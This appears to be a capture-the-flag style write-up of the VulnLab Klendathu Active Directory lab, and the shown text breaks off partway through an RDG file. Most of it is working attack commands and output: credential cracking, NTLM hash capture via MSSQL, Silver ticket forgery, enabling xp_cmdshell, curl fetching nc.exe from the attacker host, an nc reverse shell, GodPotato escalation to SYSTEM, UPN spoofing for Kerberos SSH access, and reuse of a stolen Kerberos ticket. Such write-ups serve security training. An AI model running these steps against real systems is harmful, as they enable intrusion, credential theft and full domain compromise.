---
title: VulnLab Klendathu
description: VulnLab Klendathu
image:
  path: klendathu.png
categories:
- VulnLab Chains
- Active Directory
layout: post
media_subpath: /assets/posts/labs/vulnlab/chains/klendathu
tags:
- vulnlab-chains
- active-directory
---

# Klendathu
## Recon
```
└─$ rustscan -a 10.10.219.213,10.10.219.214,10.10.219.215 -r 1-65535 -g
10.10.219.213 -> [53,88,135,139,389,445,464,3268,3269,3389,636,593,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49684,49683,61191]
10.10.219.215 -> [22,111,2049,20048,38655,60885]
10.10.219.214 -> [135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49671,49673]
```
```
└─$ nmap -sC -sV -p53,88,135,139,389,445,464,3268,3269,3389,636,593,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49684,49683,61191 10.10.219.213 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-19 23:16 +06
Nmap scan report for 10.10.219.213
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-19 17:15:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: KLENDATHU.VL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: KLENDATHU.VL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-19T17:16:26+00:00; -1m29s from scanner time.
| ssl-cert: Subject: commonName=DC1.KLENDATHU.VL
| Not valid before: 2025-06-18T17:10:29
|_Not valid after:  2025-12-18T17:10:29
| rdp-ntlm-info: 
|   Target_Name: KLENDATHU
|   NetBIOS_Domain_Name: KLENDATHU
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: KLENDATHU.VL
|   DNS_Computer_Name: DC1.KLENDATHU.VL
|   DNS_Tree_Name: KLENDATHU.VL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-19T17:16:19+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
61191/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-19T17:16:22
|_  start_date: N/A
|_clock-skew: mean: -1m28s, deviation: 0s, median: -1m28s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.99 seconds

```
```
└─$ nmap -sC -sV -p135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49671,49673 10.10.219.214                                                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-19 23:18 +06
Nmap scan report for 10.10.219.214
Host is up (0.095s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=SRV1.KLENDATHU.VL
| Not valid before: 2025-06-18T17:10:31
|_Not valid after:  2025-12-18T17:10:31
|_ssl-date: 2025-06-19T17:18:47+00:00; -1m28s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: -1m28s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.85 seconds

```
```
└─$ nmap -sC -sV -p22,111,2049,20048,38655,60885 10.10.219.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-19 23:16 +06
Nmap scan report for 10.10.219.215
Host is up (0.095s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.7 (protocol 2.0)
| ssh-hostkey: 
|   256 d6:60:45:43:4f:a1:93:21:bf:1e:dc:c3:62:65:e0:e5 (ECDSA)
|_  256 11:69:f0:03:85:9f:f4:ea:15:29:d4:c2:65:5d:27:eb (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  2,3        20048/tcp   mountd
|   100005  2,3        20048/tcp6  mountd
|   100005  2,3        20048/udp6  mountd
|   100005  3          20048/udp   mountd
|   100021  1,3,4      33687/tcp6  nlockmgr
|   100021  1,3,4      38655/tcp   nlockmgr
|   100021  1,3,4      41314/udp6  nlockmgr
|   100021  1,3,4      45944/udp   nlockmgr
|   100024  1          33789/tcp6  status
|   100024  1          38649/udp   status
|   100024  1          58507/udp6  status
|   100024  1          60885/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
20048/tcp open  mountd   2-3 (RPC #100005)
38655/tcp open  nlockmgr 1-4 (RPC #100021)
60885/tcp open  status   1 (RPC #100024)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.42 seconds

```
## srv1.klendathu.vl
Anonymous login on shares is disabled. But we find nfs on port `2049`
```
└─$ rpcinfo -p 10.10.219.215
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100024    1   udp  38649  status
    100005    1   tcp  20048  mountd
    100024    1   tcp  60885  status
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  45944  nlockmgr
    100021    3   udp  45944  nlockmgr
    100021    4   udp  45944  nlockmgr
    100021    1   tcp  38655  nlockmgr
    100021    3   tcp  38655  nlockmgr
    100021    4   tcp  38655  nlockmgr
```
We see that we can mount it
```
└─$ showmount -e 10.10.219.215         
Export list for 10.10.219.215:
/mnt/nfs_shares *
```
```
└─$ sudo mount -t nfs 10.10.219.215:/mnt/nfs_shares /mnt/nfs 
```
The nfs contains `Switch344_running-config.cfg` config
```
└─$ ls -lha /mnt/nfs             
total 8.0K
drwxr-xr-x 2 root root   42 Apr 11  2024 .
drwxr-xr-x 6 root root 4.0K May 18 22:23 ..
-rw-r--r-- 1 root root 3.5K Apr 11  2024 Switch344_running-config.cfg
```

The config contains potential user `ZIM@KLENDATHU.VL` and credentials
```
└─$ cat /mnt/nfs/Switch344_running-config.cfg 
Switch344#show running-config
Building configuration...

Current configuration : 4716 bytes
!
version 12.2
no service pad
service timestamps debug datetime msec
service timestamps log datetime msec
no service password-encryption
!
hostname Switch
!
boot-start-marker
boot-end-marker
!
enable secret 5 $1$j61qxI/P$dPYII5uCu83j8/FIuT2Wb/
enable password C1sc0
!
<SNIP>
snmp-server community public RO 
snmp-server contact ZIM@KLENDATHU.VL
!
line con 0
line vty 0 4
 password 123456
 login
line vty 5 15
 password 123456
 login
!
end

Switch344#

```
The user is valid
```
└─$ kerbrute userenum -d KLENDATHU.VL --dc 10.10.219.213 users                                                                         

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/19/25 - Ronnie Flathers @ropnop

2025/06/19 23:35:23 >  Using KDC(s):
2025/06/19 23:35:23 >   10.10.219.213:88

2025/06/19 23:35:23 >  [+] VALID USERNAME:       zim@KLENDATHU.VL
2025/06/19 23:35:23 >  Done! Tested 1 usernames (1 valid) in 0.099 seconds
```

We can crack the hash using `hashcat`
```
└─$ hashcat -a 0 -m 500 hash /usr/share/wordlists/rockyou.txt  --force     
hashcat (v6.2.6) starting
<SNIP>
$1$j61qxI/P$dPYII5uCu83j8/FIuT2Wb/:<REDACTED>  
<SNIP>
```

The password is valid too and now we can list smb shares
```
└─$ nxc smb 10.10.219.213 -u zim -p <REDACTED> --shares      
SMB         10.10.219.213   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
SMB         10.10.219.213   445    DC1              [+] KLENDATHU.VL\zim:<REDACTED> 
SMB         10.10.219.213   445    DC1              [*] Enumerated shares
SMB         10.10.219.213   445    DC1              Share           Permissions     Remark
SMB         10.10.219.213   445    DC1              -----           -----------     ------
SMB         10.10.219.213   445    DC1              ADMIN$                          Remote Admin
SMB         10.10.219.213   445    DC1              C$                              Default share
SMB         10.10.219.213   445    DC1              HomeDirs        READ,WRITE      
SMB         10.10.219.213   445    DC1              IPC$            READ            Remote IPC
SMB         10.10.219.213   445    DC1              NETLOGON        READ            Logon server share 
SMB         10.10.219.213   445    DC1              SYSVOL          READ            Logon server share 

```
```
└─$ nxc smb 10.10.219.214 -u zim -p <REDACTED> --shares
SMB         10.10.219.214   445    SRV1             [*] Windows Server 2022 Build 20348 x64 (name:SRV1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
SMB         10.10.219.214   445    SRV1             [+] KLENDATHU.VL\zim:<REDACTED> 
SMB         10.10.219.214   445    SRV1             [*] Enumerated shares
SMB         10.10.219.214   445    SRV1             Share           Permissions     Remark
SMB         10.10.219.214   445    SRV1             -----           -----------     ------
SMB         10.10.219.214   445    SRV1             ADMIN$                          Remote Admin
SMB         10.10.219.214   445    SRV1             C$                              Default share
SMB         10.10.219.214   445    SRV1             IPC$            READ            Remote IPC
```

Shares don't seem to have anything interesting, so let's collect bloodhound data
```
└─$ bloodhound-ce-python -d 'klendathu.vl' -u 'zim' -p '<REDACTED>' -c all -ns 10.10.219.213  --zip --dns-tcp --dns-timeout 60 -v 
INFO: BloodHound.py for BloodHound Community Edition
<SNIP>
```

We saw MSSQL running on `srv1.klendathu.vl` and `zim` can access it
```
└─$ nxc mssql 10.10.219.214 -u zim -p <REDACTED>                                                                               
MSSQL       10.10.219.214   1433   SRV1             [*] Windows Server 2022 Build 20348 (name:SRV1) (domain:KLENDATHU.VL)
MSSQL       10.10.219.214   1433   SRV1             [+] KLENDATHU.VL\zim:<REDACTED>
```
```
└─$ mssqlclient.py klendathu.vl/zim:'<REDACTED>'@10.10.219.214 -windows-auth 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SRV1\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SRV1\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (KLENDATHU\ZIM  guest@master)>
```

We don't have anything interesting in databases, and we can't execute commands since `xp_cmdshell` isn't enabled. Let's try capturing hash of the service that is running MSSQL
```
└─$ sudo responder -I tun0 
```

Trying to accomplish it by using `xp_dirtree`, `xp_fileexists`, `xp_subdirs` didn't work 

But this [article](https://www.brentozar.com/archive/2017/07/sql-server-2017-less-xp_cmdshell/) shows another way to do it using `sys.dm_os_enumerate_filesystem`
```
SQL (KLENDATHU\ZIM  guest@master)> SELECT * FROM sys.dm_os_enumerate_filesystem('\\10.8.4.147', 'toto')
full_filesystem_path   parent_directory   file_or_directory_name   level   is_directory   is_read_only   is_system   is_hidden   has_integrity_stream   is_temporary   is_sparse   creation_time   last_access_time   last_write_time   size_in_bytes   
--------------------   ----------------   ----------------------   -----   ------------   ------------   ---------   ---------   --------------------   ------------   ---------   -------------   ----------------   ---------------   -------------   
```

We recieve connection on our `Responder`

![](1.png)

The hash can be cracked
```
└─$ hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
<SNIP>
RASCZAK::KLENDATHU:9f433c964a06c7e4:f1ab058a7cdb97fc8692aaa44e<REDACTED>00000000000000:<REDACTED>
<SNIP>
```


The credentials are valid
```
└─$ nxc smb 10.10.219.213 -u rasczak -p '<REDACTED>'                  
SMB         10.10.219.213   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
SMB         10.10.219.213   445    DC1              [+] KLENDATHU.VL\rasczak:<REDACTED>
```

Since we have credentials for MSSQL service account, we can forge [Silver ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver#practice). Let's generate NTLM hash from the password first and get domain SID
```
└─$ lookupsid.py klendathu.vl/rasczak:'<REDACTED>'@10.10.219.213 | grep "Domain SID"      
[*] Domain SID is: S-1-5-21-641890747-1618203462-755025521
```
```
└─$ pypykatz crypto nt '<REDACTED>'      
<REDACTED>
```

Now we can use `ticketer.py` to forge the ticket for Administrator
```
└─$ ticketer.py -nthash <REDACTED> -domain-sid S-1-5-21-641890747-1618203462-755025521 -domain 'klendathu.vl' -spn MSSQLSvc/srv1.klendathu.vl Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
<SNIP>
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

And now we can connect to MSSQL as Administrator via kerberos
```
└─$ KRB5CCNAME='Administrator.ccache' mssqlclient.py srv1.klendathu.vl -windows-auth -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SRV1\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SRV1\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (KLENDATHU.VL\Administrator  dbo@master)> 

```

Now we can enable `xp_cmdshell`
```
SQL (KLENDATHU.VL\Administrator  dbo@master)> enable_xp_cmdshell
INFO(SRV1\SQLEXPRESS): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(SRV1\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

`xp_cmdshell` works and we have `SeImpersonatePrivilege` privileges
```
SQL (KLENDATHU.VL\Administrator  dbo@master)> xp_cmdshell "whoami"
output              
-----------------   
klendathu\rasczak   

NULL                

SQL (KLENDATHU.VL\Administrator  dbo@master)> xp_cmdshell "whoami /priv"
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL                                                                               

```

Let's download `nc` 
```
SQL (KLENDATHU.VL\Administrator  dbo@master)> xp_cmdshell "curl http://10.8.4.147/nc64.exe -o C:\ProgramData\nc.exe"
output                                                                             
--------------------------------------------------------------------------------   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current    

                                 Dload  Upload   Total   Spent    Left  Speed      

100 45272  100 45272    0     0  80190      0 --:--:-- --:--:-- --:--:-- 80127   

NULL                                                                               

SQL (KLENDATHU.VL\Administrator  dbo@master)> xp_cmdshell "dir C:\ProgramData"
output                                                               
------------------------------------------------------------------   
 Volume in drive C has no label.                                     

 Volume Serial Number is A401-AF84                                   

NULL                                                                 

 Directory of C:\ProgramData                                         

NULL                                                                 

04/15/2024  12:02 PM    <DIR>          Amazon                        

06/19/2025  02:32 PM            45,272 nc.exe      
<SNIP>
```

Now we need to establish reverse shell
```
SQL (KLENDATHU.VL\Administrator  dbo@master)> xp_cmdshell "cmd.exe /c C:\ProgramData\nc.exe 10.8.4.147 6666 -e cmd.exe"

```

![](2.png)

Since we had `SeImpersonatePrivilege`, we can use `GodPotato` to get system shell
```
c:\ProgramData>.\gp.exe -cmd "cmd.exe /c C:\ProgramData\nc.exe 10.8.4.147 7777 -e cmd.exe"
.\gp.exe -cmd "cmd.exe /c C:\ProgramData\nc.exe 10.8.4.147 7777 -e cmd.exe"
[*] CombaseModule: 0x140705332199424
[*] DispatchTable: 0x140705334786376
[*] UseProtseqFunction: 0x140705334081760
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\07fbd2a1-a279-47b6-aba5-99682e68a29f\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00003c02-0378-ffff-446a-be9801bafce8
[*] DCOM obj OXID: 0x985688a5b020e3c5
[*] DCOM obj OID: 0x114655998827c887
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 876 Token:0x780  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2648

```

![](3.png)

## srv2.klendathu.vl
`rasczak` has `GenericWrite` and `ForceChangePassword` over `rico` and `ibanez` users.

![](5.png)

Another interesting thing is that there's `Linux Admins` group with `flores` and `leivy` in it

![](6.png)

So the hint mentions `mixed vendor kerberos stacks`
```
Look into mixed vendor kerberos stacks 🌽 - your goal is logging into the linux server.
```

If we google we find interesting links
- [https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/)
- [https://www.youtube.com/watch?v=ALPsY7X42o4](https://www.youtube.com/watch?v=ALPsY7X42o4)

To summarize the blog, we can perform `spoofing users within GSSAPI` on linux servers that are joined to Active Directory. Since we have `GenericWrite` over user, we can modify user's `userPrincipalName` to to the value of the `samAccountName` attribute of another AD account. This will allow to abuse the authentication mechanism where `userPrincipalName` is `NT_ENTERPRISE` name-type, thus enables spoofing. Below is the simplified version of algorithm for principal search in Active Directory

![](4.png)

> AD does not allow duplicate userPrincipalName attributes to be set within the database. 
{: .prompt-info } 

From the blog
```
... write permission on the Public Information attribute set or Generic Write on any user or computer account, you can set this value to anything and it does not need to conform to a valid UPN. Therefore, we can set this to the value of the samAccountName attribute of another AD account.
```

We have required conditions to perform this attack. Let's start by changing password for `rico`
```
└─$ powerview klendathu.vl/rasczak:'<REDACTED>'@10.10.246.197                                                                                                                                                      
Logging directory is set to /home/kali/.powerview/logs/klendathu-rasczak-10.10.246.197
[2025-06-21 23:16:49] [Storage] Using cache directory: /home/kali/.powerview/storage/ldap_cache
(LDAP)-[DC1.KLENDATHU.VL]-[KLENDATHU\RASCZAK]
PV > Set-DomainUserPassword -Identity rico -AccountPassword 'P@ssword!!!'
[2025-06-21 23:17:47] [Set-DomainUserPassword] Principal CN=RICO,CN=Users,DC=KLENDATHU,DC=VL found in domain
[2025-06-21 23:17:50] [Set-DomainUserPassword] Password has been successfully changed for user RICO
[2025-06-21 23:17:50] Password changed for rico
(LDAP)-[DC1.KLENDATHU.VL]-[KLENDATHU\RASCZAK]
```

Now we set `rico`'s UPN to `leivy`
```
PV > Set-ADObject -Identity rico -Set 'userPrincipalName=leivy'
[2025-06-21 23:20:20] [Set-DomainObject] Success! modified attribute userprincipalname for CN=RICO,CN=Users,DC=KLENDATHU,DC=VL
PV > Get-DomainUser -Identity rico
cn                                : RICO
distinguishedName                 : CN=RICO,CN=Users,DC=KLENDATHU,DC=VL
name                              : RICO
objectGUID                        : {038b942c-41b2-4cc6-a74a-0a88230e5148}
userAccountControl                : NORMAL_ACCOUNT [512]
badPwdCount                       : 0
badPasswordTime                   : 01/01/1601 00:00:00 (424 years, 5 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 13/04/2024 00:07:42 (1 year, 2 months ago)
pwdLastSet                        : 21/06/2025 17:16:22 (today)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-641890747-1618203462-755025521-1109
sAMAccountName                    : RICO
sAMAccountType                    : SAM_USER_OBJECT
userPrincipalName                 : leivy
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=KLENDATHU,DC=VL
```

Ask for TGT using `NT_ENTERPRISE`
```
└─$ getTGT.py klendathu.vl/'leivy':'P@ssword!!!' -dc-ip 10.10.246.197 -principal NT_ENTERPRISE

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in leivy.ccache

```

Modify `krb5.conf` and don't forget to change `/etc/hosts`
```
[libdefaults]
    default_realm = KLENDATHU.VL
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    KLENDATHU.VL = {
        kdc = dc1.klendathu.vl
        admin_server = dc1.klendathu.vl
        default_domain = dc1.klendathu.vl
    }

[domain_realm]
    .klendathu.vl = KLENDATHU.VL
    klendathu.vl = KLENDATHU.VL
```

The last modification that we need to do is to enable kerberos and GSSAPI authentications in our `/etc/ssh/sshd_config`
```
<SNIP>
# Kerberos options
KerberosAuthentication yes
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
GSSAPIAuthentication yes
GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no
<SNIP>
```

By using `-K` option in ssh we successfully connect to `SRV2`
```
└─$ KRB5_CONFIG=krb5.conf KRB5CCNAME=leivy.ccache ssh -K 'leivy@KLENDATHU.VL'@SRV2.KLENDATHU.VL                                                                                        
The authenticity of host 'srv2.klendathu.vl (10.10.246.199)' can't be established.
ED25519 key fingerprint is SHA256:do/+6ba3S+gyhokEhfBeS+OvbKRdWTSOmhh2zfwAwAs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'srv2.klendathu.vl' (ED25519) to the list of known hosts.
[leivy@KLENDATHU.VL@srv2 ~]$ 

```

We have sudo rights
```
[leivy@KLENDATHU.VL@srv2 ~]$ sudo -l
Matching Defaults entries for leivy@KLENDATHU.VL on srv2:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User leivy@KLENDATHU.VL may run the following commands on srv2:
    (ALL : ALL) NOPASSWD: ALL

```
## dc1.klendathu.vl

We have interesting folder in `/root` directory 
```
[root@srv2 inc5543_domaincontroller_backup]# ls -lha
total 8.0K
drwxr-xr-x. 4 root root   62 Apr 11  2024  .
dr-xr-x---. 4 root root 4.0K May 19  2024  ..
drwxr-xr-x. 2 root root   38 Apr 11  2024 'Active Directory'
-rw-r--r--. 1 root root  120 Apr 11  2024  note.txt
drwxr-xr-x. 2 root root   36 Apr 11  2024  registry
[root@srv2 inc5543_domaincontroller_backup]# cat note.txt 
Incident: INC5543

I've included a backup of the domain controller before resetting all passwords after the last breach
```

But just like the note says, all passwords have been reset. Another finding is in `/tmp` directory, which contains `svc_backup`'s ticket
```
[root@srv2 tmp]# ls -lha
total 8.0K
drwxrwxrwt.  5 root                    root                      4.0K Jun 21 13:34 .
dr-xr-xr-x. 18 root                    root                       235 Apr 10  2024 ..
-rw-------.  1 svc_backup@KLENDATHU.VL domain users@KLENDATHU.VL 1.4K Jun 21 13:34 krb5cc_990001135
drwx------.  3 root                    root                        17 Jun 21 12:17 systemd-private-805970b9c6e94d13a98237147aa669a3-chronyd.service-GfQSYu
drwx------.  3 root                    root                        17 Jun 21 12:17 systemd-private-805970b9c6e94d13a98237147aa669a3-dbus-broker.service-xLGOdS
drwx------.  3 root                    root                        17 Jun 21 12:18 systemd-private-805970b9c6e94d13a98237147aa669a3-systemd-logind.service-ThLVfT
```
```
└─$ wget 10.10.246.199:8080/krb5cc_990001135
```
```
└─$ describeTicket.py krb5cc_990001135                          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : cd05b70aa64990b932a1d1db6bffe37194d41e07836fd695a357c0d19ed0fb39
[*] User Name                     : svc_backup
[*] User Realm                    : KLENDATHU.VL
[*] Service Name                  : krbtgt/KLENDATHU.VL
[*] Service Realm                 : KLENDATHU.VL
[*] Start Time                    : 21/06/2025 23:39:24 PM
[*] End Time                      : 22/06/2025 09:39:24 AM
[*] RenewTill                     : 28/06/2025 23:39:24 PM
[*] Flags                         : (0x40e10000) forwardable, renewable, initial, pre_authent, enc_pa_rep
[*] KeyType                       : aes256_cts_hmac_sha1_96
[*] Base64(key)                   : zQW3CqZJkLkyodHba//jcZTUHgeDb9aVo1fA0Z7Q+zk=
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/KLENDATHU.VL
[*]   Service Realm               : KLENDATHU.VL
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

The user has the following description `Legacy account to sync data to users Home Directories`

![](7.png)

Let's use the ticket and check the home share we saw during enumeration
```
└─$ KRB5CCNAME=krb5cc_990001135 smbclient.py klendathu.vl/svc_backup@dc1.klendathu.vl -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use HomeDirs
# ls
drw-rw-rw-          0  Thu Apr 11 06:58:10 2024 .
drw-rw-rw-          0  Mon Apr 15 22:09:19 2024 ..
drw-rw-rw-          0  Fri Apr 12 10:07:56 2024 CLEA
drw-rw-rw-          0  Fri Apr 12 10:08:12 2024 DUNN
drw-rw-rw-          0  Sat Apr 13 07:32:21 2024 JENKINS
drw-rw-rw-          0  Fri Apr 12 10:08:59 2024 SHUJUMI
# 
```

Inside `Jenkins`' directory we have the following content
```
# ls
drw-rw-rw-          0  Sat Apr 13 07:32:21 2024 .
drw-rw-rw-          0  Thu Apr 11 06:58:10 2024 ..
-rw-rw-rw-     101234  Sat Apr 13 07:32:11 2024 AppData_Roaming_Backup.zip
-rw-rw-rw-       1077  Fri Apr 12 10:08:35 2024 jenkins.rdg

```

The rdg file contains encrypted password for administrator
```
└─$ cat jenkins.rdg  
<?xml version="1.0" encoding="utf-8"?>
<RDCMan programVersion="2.93" schemaVersion="3">
  <file>
    <credentialsProfiles>
      <credentialsProfile inherit="None">
        <profileName scope="Local">KLENDATHU\administrator</profileName>
        <userName>administrator</userName>
        <password>AQAAANCMnd8BFdERjH<REDACTED>DfgrswQaShAxQ==</password>
        <domain>KLENDATHU</domain>
      </credentialsProfile>
